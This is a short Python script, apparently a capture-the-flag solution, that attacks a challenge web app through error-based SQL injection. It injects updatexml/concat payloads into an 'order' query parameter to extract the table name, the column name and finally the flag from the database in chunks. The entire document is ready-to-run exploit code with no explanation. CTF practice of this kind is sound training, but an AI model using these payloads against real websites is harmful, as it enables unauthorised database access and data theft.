import requests
import re
URL = 'http://try-sqlmap.ctf.actvn.edu.vn/'
res_regex = r"(.*?)'"

def getTableName():
    table_name = ''
    i = 1
    while True:
        params = {'order':f'updatexml(0,concat(0x0a,(select mid(table_name,{i},{i+31}) from information_schema.tables limit 1)),0)'}
        r = requests.get(URL, params=params)
        i += 31
        result = re.findall(res_regex, r.text)
        table_name += result[1]
        if result[1] == '':
            break
    print(f'[+] Table name: {table_name}')
    return table_name

def getColumnName():
    column_name = ''
    i = 1
    while True:
        params = {'order':f'updatexml(0,concat(0x0a,(select mid(column_name,{i},{i+31}) from information_schema.columns limit 1)),0)'}
        r = requests.get(URL, params=params)
        i += 31
        result = re.findall(res_regex, r.text)
        column_name += result[1]
        if result[1] == '':
            break
    print(f'[+] Column name: {column_name}')
    return column_name

def getFlag():
    table_name = getTableName()
    column_name = getColumnName()
    flag = ''
    i = 1
    while True:
        params =  {'order':f'updatexml(1,concat(0x0a,(select mid({column_name},{i},{i+31}) from {table_name})),1)'}
        r = requests.get(URL, params=params)
        i += 31
        result = re.findall(res_regex, r.text)
        flag += result[1]
        if result[1] == '':
            break
    print(f'[+] Flag: {flag}')

getFlag()